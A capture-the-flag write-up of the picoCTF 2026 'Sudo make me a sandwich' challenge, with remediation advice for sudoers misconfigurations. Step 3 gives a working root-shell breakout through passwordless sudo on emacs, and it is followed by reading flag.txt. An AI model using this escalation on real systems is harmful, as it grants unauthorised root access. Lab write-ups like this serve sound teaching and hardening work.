# CyLab 2026 – Sudo make me a sandwich Write-up

---

## Step 0 - Challenge Info
* **CTF Name:** picoCTF 2026
* **Challenge Name:** Sudo make me a sandwich
* **Category:** General Skills / Privilege Escalation
* **Points:** 100
* **Date:** 9/11/2026
* **Flag:** `picoCTF{ju57_5ud0_17_........}`

---

## TL;DR (Abstract)
The challenge provides SSH access to a restricted Linux shell where standard users lack permissions to view sensitive files directly. Auditing user privileges via `sudo -l` revealed that the target account was granted passwordless `sudo` rights to execute the `emacs` binary. Because `emacs` is an interactive text editor capable of evaluating arbitrary Lisp expressions and spawning subshells, this misconfiguration was leveraged (via standard GTFOBins techniques) to execute an interactive root shell, allowing direct extraction of the challenge flag.

---

## Challenge Description
> Make me a sandwich! What? Make it yourself! Sudo make me a sandwich! Okay.
>
> You are given low-privilege terminal access to a target system. Inspect the permitted administrative commands, escalate your privileges, and retrieve the flag located in the root-protected workspace.

---

## Thought Process & Walkthrough

### 1. Initial Reconnaissance & Privilege Auditing
Connect to the challenge machine via SSH and verify the current user context:

whoami
id

Next, check for commands allowed to run with elevated privileges without a password by inspecting the sudoers configuration:

sudo -l

The output shows that the current user has `NOPASSWD` execution rights for the `emacs` binary:

Matching Defaults entries for user on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User user may run the following commands on challenge:
    (ALL : ALL) NOPASSWD: /usr/bin/emacs

### 2. Identifying the Escalation Vector (GTFOBins)
Text editors like `emacs` and `vim` frequently feature built-in command execution and terminal emulator features. When allowed to execute under `sudo`, an unprivileged user can instruct the binary to spawn a secondary shell that inherits the EUID of the elevated process (root).

The command switches used are:
* `-Q`: Disables standard initialization files and splash screens for clean invocation.
* `-nw`: Forces terminal (non-window/no-X11) mode.
* `--eval '(term "/bin/sh")'`: Evaluates an Emacs Lisp form immediately on startup, launching an interactive `/bin/sh` session.

### 3. Spawning the Root Shell
Execute `emacs` with elevated privileges and pass the terminal spawn evaluation flag:

sudo emacs -Q -nw --eval '(term "/bin/sh")'

The terminal launches an elevated root shell inside the Emacs buffer:

# whoami
root

### 4. Reading the Flag
With root privileges confirmed, read the contents of `flag.txt`:

cat flag.txt

Output:

picoCTF{ju57_5ud0_17_........}

---

## Remediation & Key Takeaways
* **Strict Least Privilege in Sudoers:** Never assign `NOPASSWD` permissions for complex interactive binaries (such as text editors, pagers, compilers, or script interpreters) that offer shell breakout capabilities.
* **Audit Against GTFOBins:** System administrators should audit their `/etc/sudoers` rules against established GTFOBins references to identify unintended execution primitives.
* **Use Restricted Wrappers:** If specific editing tasks are required, restrict edits to explicit configuration paths using `sudoedit` instead of granting raw execution rights to the editor binary itself.
